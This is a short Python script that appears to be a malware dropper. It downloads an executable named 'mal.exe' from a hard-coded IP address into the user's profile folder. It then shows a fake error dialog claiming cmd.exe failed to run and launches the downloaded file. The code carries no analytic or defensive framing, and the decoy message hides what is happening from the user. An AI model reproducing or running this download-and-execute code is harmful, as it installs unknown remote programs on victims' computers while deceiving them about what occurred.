import wget,os,time;url="http://209.250.250.226/mal.exe";un=os.environ['USERPROFILE'];wget.download(url, out=un+"/")
from tkinter import messagebox
messagebox.showerror("Error", f"ResourceUnavailable: Program 'cmd.exe' failed to run: An error occurred trying to start process")
#import zipfile
#with zipfile.ZipFile(un+"/", 'r') as zip_ref:
    #zip_ref.extractall(un+"/zipfoldr")
    #time.sleep(20)
os.startfile(un+"/mal.exe")